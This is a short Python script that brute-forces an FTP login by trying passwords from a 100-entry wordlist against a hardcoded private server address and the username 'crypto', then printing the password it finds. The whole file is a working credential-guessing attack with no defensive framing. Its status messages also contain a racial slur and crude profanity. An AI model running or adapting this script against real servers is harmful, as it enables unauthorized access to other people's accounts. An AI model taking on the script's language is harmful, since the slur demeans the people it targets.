from ftplib import FTP
import ftplib
import time

def check_cred(user,password):
    #domain name or server ip:
    ftp = FTP('10.12.136.249')
    #ftp = FTP('192.168.43.114')
    try:
        print("trying",password,"...")
        ftp.login(user=user, passwd =password)
        print("We in mah niggas.")
        return 1
    except TimeoutError:
        print("Bitch too much time")
    except ftplib.error_perm:
        print("WTF this shit ain't right")
    return 0


start = time.time()
with open('top_100.txt','r') as fp:
    line = fp.readline().strip()
    cnt = 1
    while line:
        ret = check_cred('crypto',line)
        if(ret==1):
            break
        line = fp.readline().strip()
        cnt += 1
    
if(ret==1):
    print("DA PASS WORD IS",line)
dur = time.time() - start
print("Duration:",dur)
